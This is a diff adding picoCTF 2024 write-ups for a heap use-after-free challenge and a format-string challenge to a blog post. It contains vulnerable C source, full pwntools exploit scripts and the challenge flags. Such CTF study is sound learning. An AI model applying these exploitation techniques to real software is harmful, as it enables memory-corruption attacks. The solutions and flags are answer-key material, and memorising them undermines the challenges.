@@ -2501,10 +2501,6 @@ Flag: picoCTF{and_down_the_road_we_go_856288fc}
 #### Heap 1
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/db9942f2-6ee0-4758-930c-15d2b4110167)
 
-This one actually took me some time because I wasn't familiar with "Heap exploitation" so the ones I did based on "Heap" were just based on me looking at the behaviour in gdb
-
-And that's how I exactly solved this one too :)
-
 This time around the source code is entirely different but yet similiar
 
 You can find the whole source code [here](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Binary%20Exploitation/Heap%203/source.c)
@@ -2534,7 +2530,7 @@ void init() {
 }
 ```
 
-Now let's see the important option it provides
+Now let's see the options it provides
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/48fe1b9c-d71a-4a66-ae99-f3c20e50a314)
 
 We can allocate object and here's the code handling that
@@ -2554,14 +2550,239 @@ void alloc_object() {
 
 We can control the size of what we want to allocate and write to it. Using `scanf` it receives our input which is stored to the pointer we allocated without specifying the number of bytes we can read in causing a heap overflow
 
+We can free the structure pointer `x`, but notice that after it frees the memory it doesn't set it to NULL
+
+```c
+void free_memory() {
+    free(x);
+}
+```
+
+And finally to get the flag with option 5 we need to set `x->flag` to `pico`
+
+```c
+void check_win() {
+  if(!strcmp(x->flag, "pico")) {
+    printf("YOU WIN!!11!!\n");
+
+    // Print flag
+    char buf[FLAGSIZE_MAX];
+    FILE *fd = fopen("flag.txt", "r");
+    fgets(buf, FLAGSIZE_MAX, fd);
+    printf("%s\n", buf);
+    fflush(stdout);
+
+    exit(0);
+
+  } else {
+    printf("No flag for u :(\n");
+    fflush(stdout);
+  }
+  // Call function in struct
+}
+```
+
+Now what are the bugs so far?
+- Heap overflow in `alloc_object()`
+- Use after free (UAF) in `free_memory()`
+
+Here's how the exploit flow goes:
+- First i free the the struct object
+- Then i allocate a new malloc chunk of size 40, i could have just used 35 because that's the size of the struct but i just decided to use 40
+
+Then i fill in the struct with junks and on the 30th offset i start filling it with `pico`
+
+Here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Binary%20Exploitation/Heap%203/solve.py)
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from warnings import filterwarnings
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('chall')
+
+filterwarnings("ignore")
+context.log_level = 'info'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+break *main+415
+break *main+318
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+
+    io = start()
 
 
+def alloc(size, data):
+    io.sendline("2")
+    io.sendline(str(size))
+    io.sendline(data)
 
 
+def free():
+    io.sendline("5")
 
 
+def solve():
+    free()
+    alloc(0x28, "B"*30 + "pico")
+
+    io.interactive()
+
+def main():
+    
+    init()
+    solve()
+
+if __name__ == '__main__':
+    main()
+```
+
+Running it gives the flag
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/56eec942-c9ce-420f-aca0-9c013b33ce46)
+
+```
+Flag: picoCTF{now_thats_free_real_estate_f8fb9f96}
+```
+
+#### Format String 2
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a6ba0c7b-3a9a-4380-930c-6e2d3f2afbb3)
+
+We are given the source code and binary
+
+Checking the source code shows this
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/1424bd2a-8f10-44e2-a3fa-e9583a1303f5)
+
+Here's what it does:
+- It defines a global integer variable `sus` which stores `0x21737573`
+- It reads in our input using scanf and stores it in buffer `buf` and prints our input back using `printf`
+- If the value of `sus` equals `0x67616c66` we get the flag
+
+From this we can see that the vulnerability is format string bug and our goal is to change the value of `sus` to `0x67616c66`
+
+To do that we need to first get the offset of our input on the stack before printf is called
+
+When using a format specifier, printf will start printing values out, in order of calling convention
+
+Because this is a 64bits binary the calling convention would be:
+
+```
+rsi --> rdx --> rcx --> r8 --> r9 --> [rsp] --> [rsp+8] ....
+```
+
+Now to get the offset on the stack I set a breakpoint at `main+95` which is the call to `printf@plt`
+
+Starting the process i hit the breakpoint
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/454db117-02ac-4145-acc0-e91a78d0e684)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/db49be69-2a5b-4479-8450-7a7a2c4db5fe)
+
+Looking at the first 20 qwords of the stack i got this
+
+```
+pwndbg> x/20gx $rsp
+0x7fffffffd830: 0x00007ffff7ffe658      0x00007fff00000000
+0x7fffffffd840: 0x00007ffff7ffe2d0      0x00000000ffffffff
+0x7fffffffd850: 0x00007ffff7fcb7b0      0x00007ffff7ffdab0
+0x7fffffffd860: 0x0000000000000001      0x00007fffffffd990
+0x7fffffffd870: 0x4141414141414141      0x0000000000000000
+0x7fffffffd880: 0x0000000000000000      0x00007ffff7fcbca8
+0x7fffffffd890: 0x00007fffffffd9d0      0x00007ffff7fcb7b0
+0x7fffffffd8a0: 0x0000000000000006      0x0000001d00000006
+0x7fffffffd8b0: 0x00007ffff7ffdab0      0x00007ffff7fd8d2d
+0x7fffffffd8c0: 0x0000000000000000      0x00007ffff7fd9f08
+pwndbg> 
+```
+
+We can see that our offset is at 9 because it contains `0x4141414141414141` but that's not going to be the final value because we need to consider the calling convention so we add 5 making it 14
+
+So that means the offset is 14. Alternatively I wrote a fuzz script which would just get the offset and here's the [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Binary%20Exploitation/Format%20String%202/fuzz.py)
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/9c912c70-0d67-47c4-917f-52a0e4c37ca9)
+
+With that said we can now easily overwrite the global variable to a desired value using pwntools `fmtstr_payload` function
+
+Here's my solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/picoctf/scripts/2024/Binary%20Exploitation/Format%20String%202/solve.py)
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from warnings import filterwarnings
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('vuln')
+
+filterwarnings("ignore")
+context.log_level = 'info'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+def init():
+    global io
+
+    io = start()
+
+def solve():
+    offset = 14
+
+    sus = exe.sym['sus']
+    overwrite = 0x67616c66
+    write = {sus: overwrite}
+
+    payload = fmtstr_payload(offset, write)
+    print(f"Payload: {payload}")
+    io.sendline(payload)
+
+    io.interactive()
+
+def main():
+    
+    init()
+    solve()
 
 
+if __name__ == '__main__':
+    main()
+```
+
+Running it gives the flag
+![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/3c838d36-307b-4623-94f8-936fa1c9f07a)
+
+```
+Flag: picoCTF{f0rm47_57r?_f0rm47_m3m_741fa290}
+```
 
 
 
